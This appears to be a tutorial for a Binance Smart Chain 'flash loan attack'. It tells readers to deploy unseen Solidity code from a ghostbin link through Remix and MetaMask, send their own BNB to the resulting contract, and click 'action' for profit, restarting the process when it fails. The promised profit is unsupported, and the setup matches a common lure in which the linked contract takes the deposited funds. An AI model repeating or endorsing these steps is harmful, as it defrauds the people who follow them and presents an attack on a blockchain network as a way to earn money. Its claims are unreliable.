Video Tutorial - https://youtu.be/vDMFHqbAoEk

Remix Link - http://remix.ethereum.org/

Step By Step Tutorial :
1. Download MetaMask For Chrome Web Browser


You can download and install MetaMask from this link: https://chrome.google.com/webstore/de...


2. Create a “Custom RPC” in MetaMask for connecting to Binance Smart Chain


 Name: Smart Chain 
    New RPC URL: https://bsc-dataseed.binance.org/ 
    ChainID: 56 
    Symbol: BNB 
    Block Explorer URL: https://bscscan.com 
      
this step is used for connecting your wallet to the Mainnet network Smart Chain. Below this is the network setting to add a Smart Chain.


For complete info about the explanation, please visit this Binance official article: https://academy.binance.com/en/articl...


3. Open http://remix.ethereum.org/ from your browser


Open Ethereum Remix to make or extend the smart contract which later is used for making a smart contract Flash Loan Attack to the Binance Smart Contract network.


4. Click on Solidity Compiler (2nd menu button from the left) and select compiler version to 0.5.0


Change the compiler version to “0.5.0”. This is needed to make your compiler version is the same as the source code you'll use.


5. Create a file Solidity “FlashLoan.sol” in the File Explorer (you can find the code on https://ghostbin.com/p3c3q)


6. Click on Solidity Compiler (2nd menu button from the left) and Compile


Look for a dropdown Contract at the bottom of the Solidity Compiler menu, on that dropdown Contract choose “GetFlash Loan (Flash Loan.sol)” and then click Compile FlashLoan.sol.


7. Click on Deploy & run transactions (3rd menu button from the left) and Deploy


- At the very top, change the dropdown Environment value to “Injected Web3” (For remix users, firstly there will be a confirmation on the MetaMask, Accept the confirmation notification on the MetaMask wallet Chrome Extention).
- The MetaMask wallet address will automatically be connected If you're already connected to your MetaMask Account.
- There's a dropdown next to the, click that dropdown and create a Smart Contract name you desired. Eg. :


    _TOKENNAME = FlashLoan (write random token name)
    _TOKENSYMBOL = FLO (write random three of four-letter symbol)
    _LOANAMOUNT = 10 (amount loan)
      
- Click Transact and confirm in MetaMask.
- after you create a Smart Contract, wait till the transaction complete and you'll have your smart contract address.


8. Input a Liquidity to the Smart Contract


To input a Liquidity, transfer your nominal BNB to the Smart Contract address you have created before by using the transfer feature in the MetaMask Chrome Extention. Send the nominal BNB ( the amount BNB will affect the profit you will earn ). Wait till the liquidity addition transaction complete.


9. Flash Loan Attack


After creating a Smart Contract with liquidity added ( Step 8 ) and set the amount of loan ( Step 7 ), click the dropdown from the success transaction ( Step 7 ) it will display a dropdown menu with some button that is action, tokenName, tokenSymbol. Click "action" ( red button ) to run the smart contract. wait for a while until the transaction complete, and regularly check your BNB balance on the wallet from the MetaMask Chome Extension.


Note: Sometimes the code give error and sometimes it will not work from the first time.You must then start the whole process from begining.
